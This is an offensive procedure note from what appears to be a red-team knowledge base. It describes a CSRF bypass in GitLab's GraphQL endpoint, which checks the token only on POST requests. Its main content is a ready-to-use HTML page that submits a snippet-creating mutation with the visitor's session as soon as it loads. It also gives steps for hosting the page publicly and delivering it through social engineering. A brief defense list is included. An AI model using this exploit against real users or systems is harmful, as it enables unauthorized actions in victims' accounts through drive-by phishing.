---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - csrf
  - html
  - form
  - graphql
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:57.646Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-and-Host-Malicious-HTML-Form-for-GitLab-CSRF

## Summary

This procedure creates and hosts an HTML file that exploits a CSRF bypass in GitLab's GraphQL endpoint by auto-submitting a GET request with a mutation payload, allowing unauthorized state changes like snippet creation.

## Description

The GitLab /api/graphql endpoint validates the X-CSRF-Token only for POST requests, skipping it for GET. This procedure crafts an HTML form with hidden inputs for the GraphQL query (mutation to createSnippet) and variables (JSON with snippet details), then uses JavaScript to auto-submit via GET. Hosting this on a public server enables drive-by exploitation when visited by an authenticated user. Prerequisites include basic web hosting access; expected outcome is silent execution of the mutation using the victim's session.

## Requirements

1. Public web hosting (e.g., GitHub Pages, Vercel, or ngrok for local)
2. Knowledge of GraphQL mutations for GitLab (e.g., createSnippet input)
3. Victim must be authenticated to GitLab during visit

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens for all state-changing requests, including GET
- Implement SameSite=Strict cookies to prevent cross-site requests
- Monitor for anomalous GraphQL mutations from unexpected sources
- Educate users on phishing links

## Objectives

1. Deploy a payload that bypasses CSRF via GET method
2. Enable auto-submission without user interaction
3. Prepare for social engineering delivery

## Instructions

### Step 1: Craft the Malicious HTML

**Context**: Create the HTML file with form and auto-submit script targeting GitLab's GraphQL endpoint.

No command; manually create the file.

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <form id="exploit-form" action="https://gitlab.com/api/graphql" method="GET">
        <input type="hidden" name="query" value="mutation createSnippet($snippet: CreateSnippetInput!) { createSnippet(input: $snippet) { snippet { id title } } }">
        <input type="hidden" name="variables" value='{"snippet":{"title":"Tesssst Snippet","description":"Test description","visibility":"public","file_path":"test.txt","content":"This snippet was created via CSRF exploit."}}'>
    </form>
    <script>document.getElementById('exploit-form').submit();</script>
</body>
</html>
```

> This HTML defines a GET form with the mutation query and variables JSON. The script submits it immediately on load, sending the request with victim's cookies.

### Step 2: Host the HTML File

**Context**: Upload the file to a public host to generate a shareable URL.

No command; use hosting platform UI (e.g., create repo on GitHub, add index.html, enable Pages).

**Expected Output**: A URL like https://attacker.github.io/csrf-exploit/ that loads the page.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[graphql]]
